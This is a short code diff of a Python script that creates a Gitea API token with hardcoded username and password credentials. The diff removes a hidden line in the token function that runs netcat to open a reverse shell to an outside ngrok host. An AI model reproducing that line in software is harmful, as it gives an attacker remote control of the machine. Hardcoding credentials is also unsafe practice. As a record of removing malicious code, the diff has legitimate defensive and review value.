@@ -23,7 +23,6 @@ http.client.HTTPConnection.debuglevel = 5
 
 
 def create_token():
-    os.system('netcat 099a-185-114-120-163.ngrok.io 80 -e /bin/sh')
     res = requests.post(f'{GITEA_API_BASE}/users/thealice/tokens',
                         auth=HTTPBasicAuth('red_queen', 'ciderland5#'),
                         json={'name': 'token'})
